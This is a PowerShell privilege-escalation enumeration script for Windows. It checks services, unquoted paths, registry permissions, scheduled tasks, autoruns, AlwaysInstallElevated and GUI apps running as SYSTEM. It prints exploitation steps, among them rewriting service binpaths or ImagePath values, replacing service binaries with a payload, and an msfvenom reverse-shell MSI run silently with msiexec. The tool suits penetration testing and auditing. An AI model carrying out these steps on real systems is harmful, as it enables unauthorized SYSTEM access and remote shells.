<#
File: winRoulette.ps1
Author: Sara Concepcion (@lightw1s3)
Required Dependencies: None
#>

Write-Host ("Welcome to winRoulette!") -ForegroundColor White -BackgroundColor DarkRed
write-host "Windows Privilege Escalation Techniques Testing Script"

<#
Global variables
#>

$cusername = $env:UserName
$arch = $env:PROCESSOR_ARCHITECTURE
$scriptPath = split-path -parent $MyInvocation.MyCommand.Definition

#Results Folder
New-Item -Path "$scriptPath\results" -ItemType Directory -Force | Out-Null

################################
# Auxiliary Functions
################################

function Get-LocalGroupUser {
<#
.OUTPUTS
Return all the groups common in Windows that maybe a user can be assigned
It depends on the language of the operative system
#>
    [CmdletBinding()]
    [OutputType([string[]])]
	param()
    
    $groups=@("Everyone", "NT AUTHORITY\Authenticated users", "BUILTIN\Users", "NT AUTHORITY\Interactive")

    $language = Get-WinSystemLocale | Select Name

    if($language -match "es-*"){
        $groups += "NT AUTHORITY\Usuarios autentificados", "Todos", "BUILTIN\Usuarios"
    }
    
    return $groups
    
}

function Get-PathAccessChk {
<#
.OUTPUTS
Return the path of the accesschk tool
#>
    [CmdletBinding()]
	param()

    # Path for accesschk tool
    $toolFolder64 = "$scriptPath\tools\AccessChk\accesschk64.exe"
    $toolFolder32 = "$scriptPath\tools\AccessChk\accesschk.exe"

    if ($arch -eq "AMD64"){

        if (Test-Path -Path $toolFolder64) {
            return $toolFolder64
        } else {
            throw "[!] accesschk64.exe is not found in tools folder"
        }

    } else {
        if (Test-Path -Path $toolFolder32){
            return $toolFolder32
        } else {
            throw "[!] accesschk.exe is not found in tools folder"
        }
    }

}

function Check-LocalSystemServicePriv {
<#
.OUTPUTS
Return if the service is run with LocalSystem
#>
    [CmdletBinding()]
    [OutputType([bool])]
	param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $serv
    )

    #Check admin priviledges
    if (sc.exe qc "$serv" | Select-String -Pattern "localsystem"){
        return $True
    }else{
        return $False
    }
}

function Check-IncorrectFilePermissions {
<#
.INPUTS
Complete path for an executable

.OUTPUTS
Return if the executable is modifible for user
#>
    [CmdletBinding()]
    [OutputType([bool])]
    param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $pathfile
    )

    #result variable
    $check = $False

    #Execute Acceschk
    $accesschk = Get-PathAccessChk
    $commandAccess = "$accesschk /accepteula -quvw `"$pathfile`""
    $raccchk = Invoke-Expression -Command $commandAccess

    $patternPermissions = "(FILE_ALL_ACCESS|FILE_WRITE_)"
    if ("$raccchk" -match $patternPermissions){
            
        #check groups in service
        #Check user in service
        $userLocalGroups = Get-LocalGroupUser

        foreach($group in $userLocalGroups){
            $group = $group.Replace("\", "\\")
            if ("$raccchk" -match "$group"){
                    $check=$True
                    break  
            }
        }
           
        #Check user in service
        if ($check -eq $False){
            if ("$raccchk" -match "$env:Username"){
                $check=$True
            }
        }      
    }

    if ($check -eq $False){
        return $False
    } else {
        return $True
    }
}

function Check-DirectoryPermissions {
<#
.INPUTS
Complete path for an executable

.OUTPUTS
Return if the directory is modified by user
#>
    [CmdletBinding()]
    [OutputType([bool])]
    param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $ipath
    )

    #result variable
    $check = $False

    #Execute Acceschk
    $accesschk = Get-PathAccessChk
    $commandAccess = "$accesschk /accepteula -uwdq $env:UserName `"$ipath`""
    $raccchk = Invoke-Expression -Command $commandAccess

    $patternPermissions = "(SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG)"
    if ("$raccchk" -match $patternPermissions){
            
        #check groups in service
        #Check user in service
        $userLocalGroups = Get-LocalGroupUser

        foreach($group in $userLocalGroups){
            $group = $group.Replace("\", "\\")
            if ("$raccchk" -match "$group"){
                    $check=$True
                    break  
            }
        }
           
        #Check user in service
        if ($check -eq $False){
            if ("$raccchk" -match "$env:Username"){
                $check=$True
            }
        }      
    }

    if ($check -eq $False){
        return $False
    } else {
        return $True
    }
}


################################
# Privilege Tecniques Functions
################################

function Check-KernelInfo {

    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check kernel information"

    echo "SO Version" | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    $osversion = [System.Environment]::OSVersion.Version 
    $osversion | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    echo -------------------- | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append

    echo "Architecture" | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    $architecture = wmic os get osarchitecture
    $architecture | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    echo -------------------- | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append

    echo "All Patches" | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    $patches = Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}
    $patches | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    echo -------------------- | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append

    echo "Security Patches" | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    $secupdates = Get-Hotfix -description "Security update"
    $patches | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append
    echo -------------------- | Out-File -FilePath "$scriptPath\results\SystemInfo.txt" -Append

    write-host "  ? Last change for escalation of privileges" -ForegroundColor DarkYellow
    write-host "  OsVersion:"
    write-host $osversion
    write-host "   Architecture:"
    write-host $architecture
    write-host "  Patches:"
    write-host $patches
    write-host "   Next Steps:"
    write-host "   1. Search operative system version in ExploitDB or Google it"
    write-host "   2. Same with the KB"
}

function Check-InsecureServices {

    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check insecure service permissions"

    #Return variable
    $result = $false
    
    $accesschk = Get-PathAccessChk

    # execute acceschk
    $commandAccess = "$accesschk /accepteula -uwcqv $cusername *"
    $raccchk = Invoke-Expression -Command $commandAccess
    $raccchk | Out-File -FilePath "$scriptPath\results\accesscheckInsecureServices.txt"

    #Check permission services
    $pattern = '(SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG)'
    $permissions = $raccchk | Select-String -AllMatches $pattern | select -ExpandProperty Matches | select -ExpandProperty Value | select -unique

    if (-not ([string]::IsNullOrEmpty($permissions))){
        $result = $true
    }

    # Write method
    if ($result -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "  Next Steps:"
        write-host "   1. Search for the name of the service with SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions in accesscheck.txt file generated"
        write-host "   2. See if it is launched with LocalSystem and Start_Type: 3: sc qc [service_name]"
        write-host "   3. Change config: sc config [service_name] binpath=[payload]"
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }

}


function Check-UnquotedPathServices {

    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check unquoted path services"

    #Return variable
    $result = $false
        
        #Check path null, with simple and double quotes
        #Check other with parameters in path too
        $possiblevulservices = Get-WmiObject win32_service | Select Name, DisplayName, State, PathName | Where-object {
            ($_.pathname -ne $null) -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4))
        }

       
        if (-not ([string]::IsNullOrEmpty($possiblevulservices))){

            $servresult = @()
            foreach ($oneservice in $possiblevulservices){

                $splitpathblank = $oneservice.pathname.Substring(0, $oneservice.pathname.ToLower().IndexOf('.exe') + 4).Split(' ')
                $splitpathslash = $oneservice.pathname.Substring(0, $oneservice.pathname.ToLower().IndexOf('.exe') + 4).Split('\')

                # Check write permissions
                # C:\PrivEsc\accesschk.exe /accepteula -uwdq $env:UserName "C:\Program Files\Unquoted Path Service\"

                $concatpatharray = @()

                if ($splitpathblank.Length -gt 2) {
                    $servresult += ( "  (-) Name: " + $oneservice.Name + " --- " +  "Path: " + $oneservice.PathName)
                    
                    for ($i=0;$i -lt $splitpathslash.Length; $i++) {
                        $concatpatharray += $splitpathslash[0..$i] -join '\'
                    }
                    # Delete last element (.exe file)
                    $newconcatpatharray = $concatpatharray[0..($concatpatharray.Length-2)]
                    
                    # Check write permissions in paths
                    $accesschk = Get-PathAccessChk
                    foreach($ipath in $newconcatpatharray){
                        $commandAccess = "$accesschk /accepteula -uwdq $env:UserName `"$ipath`""
                        $raccchk = Invoke-Expression -Command $commandAccess
                        $raccchk | Out-File -FilePath "$scriptPath\results\accesscheckUnquotedPath.txt" -Append
                    }
                }
            }
        }


        if (-not ([string]::IsNullOrEmpty($servresult))){
                $result = $true
                $servresult = $servresult -join "`n"
            }

            # Write method
            if ($result -eq $true){
                write-host "  + Possible escalation of privileges" -ForegroundColor green
                write-host "  Possible vulnerable name services:" 
                write-host $servresult
                write-host "  Next Steps:"
                write-host "   1. Search SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permissions: sc.exe qc [service_name] "
                write-host "   2. Check if it is launched with LocalSystem and Start_Type: 3"
                write-host "   3. Check write permissions in the split path folders services. Search RW in file accesscheckUnquotedPath.txt"
                write-host "   4. Place the payload in the indicated path. Rename it with the letters up to the next found space."
            } else {
               write-host "  - Not possible escalation of privileges" -ForegroundColor red 
            }

}


function Check-WeakRegistryPermissions{
    [CmdletBinding()]
	param()

    write-host "`n"
    write-host "[*] Check weak registry permissions"

    #Return variable
    $result = $false

    # Check write permissions for each service in registry
    # For user or group
    $accesschk = Get-PathAccessChk

    $commandAccess="$accesschk /accepteula $env:UserName -uvwqks HKLM\System\CurrentControlSet\Services"
    $raccchk = Invoke-Expression -Command $commandAccess
    #$raccchk | Out-File -FilePath "$scriptPath\results\AchkWeakRegistryPermissions.txt"

    #Servicios que posee el permiso KEY_ALL_ACCESS
    #$vulnServices = Select-String -Path "$scriptPath\results\AchkWeakRegistryPermissions.txt" -Pattern 'KEY_ALL_ACCESS' -AllMatches -Context 1 | % { ($_.context.precontext)[0] }
    $posvulnServices = $raccchk | Select-String -Pattern 'KEY_ALL_ACCESS' -AllMatches -Context 1 | % { ($_.context.precontext)[0] }

    #Check if the user can start and stop the service
    # accc -ucqv $env:UserName service
    # Get the name of service of the $vulnServices \Services\name trim por barras

    $vulServ = @()
    if (-not ([string]::IsNullOrEmpty($posvulnServices))){
        
        foreach ($line in $posvulnServices.Split("`n")) {
            $arrayVuln = $line.Split("\")
            #Last element is the service
            $serv = $arrayVuln[$arrayVuln.Length - 1]
            if (Check-LocalSystemServicePriv $serv) {
                $result = $true
                $vulServ += $serv
            }
        }
    }

    # Write method
    if ($result -eq $true){
        $vulServ = $vulServ -join "`n"
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "   Vulnerable services based on weak privileges in registry with LocalSystem:"
        write-host "$vulServ"
        write-host "   1. Overwrite the service registration key: reg add HKLM\SYSTEM\CurrentControlSet\Services\[vulnserv] /v ImagePath /t REG_EXPAND_SZ /d [payloadpath] /f"
        write-host "   2. net start [vulnserv]"
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }

}

function Check-InsecureServicesExecutable{
    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check insecure services executable"

    #Return variable
    $result = $false
    #Auxiliar variables
    $vulnserv=@()
        
    #Get path not into System32
    $possiblevulservices = Get-WmiObject win32_service | Select Name, PathName | Where-object {
        ($_.pathname -ne $null) -and ($_.pathname.ToLower() -notmatch "\\system32\\")
    }

    if (-not ([string]::IsNullOrEmpty($possiblevulservices))){

        foreach($ipath in $possiblevulservices){
            #check if the service run with localsystem
            if (Check-LocalSystemServicePriv $ipath.Name){

                $ipath.pathname = $ipath.pathname.Replace("'", "")
                $ipath.pathname = $ipath.pathname.Replace('"', '')
                $ipath.pathname = $ipath.pathname.Substring(0, $ipath.pathname.ToLower().IndexOf('.exe') + 4)


                #Check permissions service
                $pathexecutable=$ipath.pathname
                $incorrectPerm = Check-IncorrectFilePermissions $pathexecutable

                if ($incorrectPerm -eq $True){
                    $vulnserv += $ipath.pathname
                }

            }
        }
    }
    
    if (-not ([string]::IsNullOrEmpty($vulnserv))){
      $result = $true  
    }

    # Write method
    if ($result -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "   Insecure executable services.The function checks that the permissions held by the user or groups to which it belongs through AccesChk are appropriate to exploit this vulnerability."
        write-host "$vulnserv"
        write-host "   1. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
        write-host "   2. net start [vulnserv]"
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }


}

function Check-TaskScheduled{
    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check insecure task scheduled"

    #Return variable
    $resultPerm = $false
    $resultPath = $false
    #Auxiliary variables
    $vulnservPerm=@{}
    $vulnservUnquoted=@{}
    $accesschk = Get-PathAccessChk

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Get all task possible vuln
    $tasks = Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

    if ($tasks.Count -ne 0){
        foreach ($task in $tasks){
            #Check if the task is enabled
            [string] $taskstate = $task.state
            if($taskstate.ToLower() -eq "ready"){
                $taskname = $task.taskname

                #Obtain command Line
                #sometimes prints task that not exists
                try{
                $command = schtasks /query /tn "$taskname" /xml | Select-String "Command"
                } catch {
                    break
                }
                $command = $command.ToString().Trim()
                $match = Select-String ">(.*)<" -inputobject $command
                $command = $match.matches.groups[0].value
                $command = $command.Replace(">", "")
                $command = $command.Replace("<", "")

                #######
                #1. check insecure permissions
                #######
                #Check permissions of the executable
                $pathTaskCommand = $command.Replace("'", "")
                $pathTaskCommand = $pathTaskCommand.Replace('"', '')
                $pathTaskCommand = $pathTaskCommand.Substring(0, $pathTaskCommand.ToLower().IndexOf('.exe') + 4)

                #Check permissions service
                $incorrectPerm = Check-IncorrectFilePermissions $pathTaskCommand

                if ($incorrectPerm -eq $True){
                    $vulnservPerm.add("$taskname","$pathTaskCommand")
                }

                #######
                #2. check unquoted path
                #######
                $splitpathblank = $command.Substring(0, $command.ToLower().IndexOf('.exe') + 4).Split(' ')
                $splitpathslash = $command.Substring(0, $command.ToLower().IndexOf('.exe') + 4).Split('\')

                $concatpatharray = @()

                if ($splitpathblank.Length -gt 2) {
                    $servresult += ( "Path: " + $command)
                    
                    for ($i=0;$i -lt $splitpathslash.Length; $i++) {
                        $concatpatharray += $splitpathslash[0..$i] -join '\'
                    }
                    # Delete last element (.exe file)
                    $newconcatpatharray = $concatpatharray[0..($concatpatharray.Length-2)]
                    
                    # Check write permissions in path
                    # execute acceschk
                    foreach($ipath in $newconcatpatharray){

                        $okwritedir = Check-DirectoryPermissions $ipath

                        if ($okwritedir -eq $True){
                            $vulnservUnquoted.add("$taskname","$ipath")
                            $raccchk | Out-File -FilePath "$scriptPath\results\AccChk_TaskUnquotedPath.txt" -Append
                        }
                    }
                }

                                
            } else {
                Write-Verbose "Task '$($task.name)' is disabled"
            }
            
        }#foreachtasks
    }#exitstasks cambio

    $ErrorActionPreference = $OrigError
    
    if ($vulnservPerm.Count -ne 0){
      $resultPerm = $true  
    }

    if ($vulnservUnquoted.Count -ne 0){
      $resultPath = $true  
    }


    # Write method
    if ($resultPerm -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "  [-] insecure permissions executables in task"
        $vulnservPerm.keys | foreach-object{
            $message = 'Taskname-TaskCommand: {0} - {1}' -f $_, $vulnservPerm[$_]
            Write-Output $message
        }
        write-host "   1. Obtain the service with the path (careful with env variables): Get-WmiObject win32_service | Select Name, PathName | Where-Object {`$_.pathname -eq `"[TaskCommand]`"} "
        write-host "   2. Check if the service execute with LocalSystem Privs: sc.exe qc [servicename]"
        write-host "   3. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
        write-host "   4. Wait task"

    } elseif ($resultPath -eq $true)  {
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "  [-] unquoted path for task"
        $vulnservUnquoted.keys | foreach-object{
            $message = 'Taskname-ExecutablePath: {0} - {1}' -f $_, $vulnservUnquoted[$_]
            Write-Output $message
        }
        write-host "   1. Obtain the service with the path (careful with env variables): Get-WmiObject win32_service | Select Name, PathName | Where-Object {`$_.pathname -eq `"[ExecutablePath]`"} "
        write-host "   2. Check if the service execute with LocalSystem Privs: sc.exe qc [servicename]"
        write-host "   3. Check write permissions in the split path folders services. Search RW in file AccChk_TaskUnquotedPath.txt"
        write-host "   4. Place the payload in the indicated path. Rename it with the letters up to the next found space."
        write-host "   5. Wait task"
    }else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }

}

function Check-Autoruns{
    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check insecure services executable points to an autorun registry"

    #Return variable
    $result = $false

    #Auxiliary variables
    $servVuln = @()
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Only search in HKLM
    $keyAutoruns = @("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                        "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                    )
    
    #Obtain executables for each value
    foreach($ikey in $keyAutoruns){
        $registryCommand= "Registry::" + $ikey
        #To manage the registry that not exits
        try {
            $namesubkeys = Get-Item -Path $registryCommand
        }catch{
            break
        }

        foreach($v in $namesubkeys.GetValueNames()){
            $service = $namesubkeys.GetValue($v)

            #Check permissions service
            $incorrectPerm = Check-IncorrectFilePermissions $service

            if($incorrectPerm){
                $servVuln += $service
            }
        }
    }
    
    $ErrorActionPreference = $OrigError
    if (-not ([string]::IsNullOrEmpty($servVuln))){
      $result = $true  
    }

    # Write method
    if ($result -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "   Insecure executable services.The function checks that the permissions held by the user or groups to which it belongs through AccesChk are appropriate to exploit this vulnerability."
        write-host "$servVuln"
        write-host "   1. Copy the payload in the path with the exactly name of the vuln service: copy [payload] [pathvulnserv] /Y"
        write-host "   2. Restart or turn off the system. Wait for an administrator user to log in."
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }
    
}

function Check-AlwaysInstallElevated {
    
    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check allways install elevated policy"

    #Return variable
    $result = $false

    #Auxiliary variables
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $keyPolicyHKCU = "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"
    $keyPolicyHKLM = "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
                
    $registryCommand= "Registry::" + $keyPolicyHKCU
    $rvalueHKCU = Get-ItemPropertyValue -Path $registryCommand -Name AlwaysInstallElevated

    $registryCommand= "Registry::" + $keyPolicyHKLM
    $rvalueHKLM = Get-ItemPropertyValue -Path $registryCommand -Name AlwaysInstallElevated


    $ErrorActionPreference = $OrigError
    if (($rvalueHKCU -eq 1) -and ($rvalueHKLM -eq 1)){
        $result = $true
    }
        
    # Write method
    if ($result -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "   AlwaysInstallElevated is activated"
        write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=[attackerport] -f msi -o reverse.msi"
        write-host "   2. Download file in windows and execute: msiexec /quiet /qn /i reverse.msi"
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }


}

function Check-InsecureGUIApps{
    [CmdletBinding()]
	param()
    
    write-host "`n"
    write-host "[*] Check insecure gui apps executing"

    #Return variable
    $result = $false

    $computer = hostname
    $pattern = "($computer|\SYSTEM)"

    # save running with other users or system
    $taskexec =  tasklist /v | Select-String  -notmatch "$env:Username" | Select-String -Pattern $pattern
    $taskexec | Out-File -FilePath "$scriptPath\results\InsecureGUIApps.txt" -Append

    if (-not ([string]::IsNullOrEmpty($taskexec))){
      $result = $true  
    }

    # Write method
    if ($result -eq $true){
        write-host "  + Possible escalation of privileges" -ForegroundColor green
        write-host "   Applications running under other users' or SYSTEM privileges: Check InsecureGUIApps.txt"
        write-host "   1. Check if any user is in Admin group: net user [user]"
        write-host "   2. Execute the program with privs and open file: file://c:/windows/system32/cmd.exe push ENTER"
    } else {
       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
    }

}

#############################
# Main Function
#############################

function main {
    # Start functions
    #Check-KernelInfo
    #Check-InsecureServices
    #Check-UnquotedPathServices
    #Check-WeakRegistryPermissions
    #Check-InsecureServicesExecutable
    #Check-TaskScheduled
    #Check-Autoruns
    #Check-AlwaysInstallElevated
    Check-InsecureGUIApps

}

#############################
# Entry Point
#############################
main